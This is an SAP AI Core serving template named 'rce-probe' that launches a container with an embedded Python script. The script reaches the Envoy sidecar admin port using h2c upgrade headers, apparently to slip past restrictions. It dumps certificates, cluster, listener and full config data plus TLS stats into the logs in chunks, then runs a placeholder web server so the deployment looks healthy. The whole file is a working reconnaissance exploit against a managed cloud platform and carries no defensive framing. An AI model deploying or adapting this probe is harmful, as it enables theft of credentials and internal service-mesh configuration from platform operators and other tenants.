apiVersion: ai.sap.com/v1alpha1
kind: ServingTemplate
metadata:
  name: rce-probe
  labels:
    scenarios.ai.sap.com/id: "rce-probe"
    ai.sap.com/version: "4.4.0"
  annotations:
    scenarios.ai.sap.com/name: "rce-probe"
    executables.ai.sap.com/name: "rce-probe"
    executables.ai.sap.com/description: "envoy-admin-certs-clusters-config-dump"
spec:
  template:
    apiVersion: "serving.kserve.io/v1beta1"
    metadata:
      annotations: |
        autoscaling.knative.dev/target: 1
      labels: |
        ai.sap.com/resourcePlan: starter
    spec: |
      predictor:
        minReplicas: 1
        maxReplicas: 1
        containers:
        - name: kserve-container
          image: python:3.11
          command: ["/bin/sh", "-c"]
          args:
          - |
            python3 -c "
            import socket

            print('[PROBE_V44_START]', flush=True)

            def envoy_admin(path, timeout=15):
                try:
                    s = socket.socket()
                    s.settimeout(timeout)
                    s.connect(('127.0.0.1', 15000))
                    req = (
                        f'GET {path} HTTP/1.1\r\n'
                        'Host: 127.0.0.1\r\n'
                        'Connection: Upgrade, HTTP2-Settings\r\n'
                        'Upgrade: h2c\r\n'
                        'HTTP2-Settings: AAMAAABkAAQAAP__\r\n'
                        'Connection: close\r\n\r\n'
                    )
                    s.sendall(req.encode())
                    chunks = []
                    while True:
                        c = s.recv(65536)
                        if not c: break
                        chunks.append(c)
                    s.close()
                    return b''.join(chunks).decode(errors='replace')
                except Exception as e:
                    return f'ERR:{e}'

            # --- 1. Envoy /certs ---
            resp = envoy_admin('/certs')
            print('[ENVOY_CERTS]', resp, flush=True)

            # --- 2. Envoy /clusters ---
            resp = envoy_admin('/clusters')
            # Print in chunks to fit log entries
            for i in range(0, len(resp), 2000):
                print(f'[ENVOY_CLUSTERS_{i}]', resp[i:i+2000], flush=True)

            # --- 3. Envoy /listeners ---
            resp = envoy_admin('/listeners')
            print('[ENVOY_LISTENERS]', resp[:8000], flush=True)

            # --- 4. Envoy /config_dump (large, chunk it) ---
            resp = envoy_admin('/config_dump', timeout=30)
            total = len(resp)
            print(f'[ENVOY_CONFIG_TOTAL_BYTES] {total}', flush=True)
            chunk_size = 3000
            for i in range(0, min(total, 120000), chunk_size):
                print(f'[CFG_{i}]', resp[i:i+chunk_size], flush=True)

            # --- 5. Envoy /stats (key stats for internal service comms) ---
            resp = envoy_admin('/stats')
            # Filter for cluster-level upstream stats only
            lines = [l for l in resp.split('\n')
                     if any(k in l for k in ['upstream_cx', 'upstream_rq',
                                              'ssl.handshake', 'ssl.fail',
                                              'ssl.connection_error'])]
            print('[ENVOY_STATS_FILTERED]', '\n'.join(lines[:200]), flush=True)

            print('[PROBE_V44_DONE]', flush=True)
            " 2>&1
            python3 -c "
            import http.server
            class H(http.server.BaseHTTPRequestHandler):
                def do_GET(self): self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
                def log_message(self, *a): pass
            http.server.HTTPServer(('', 8080), H).serve_forever()
            "
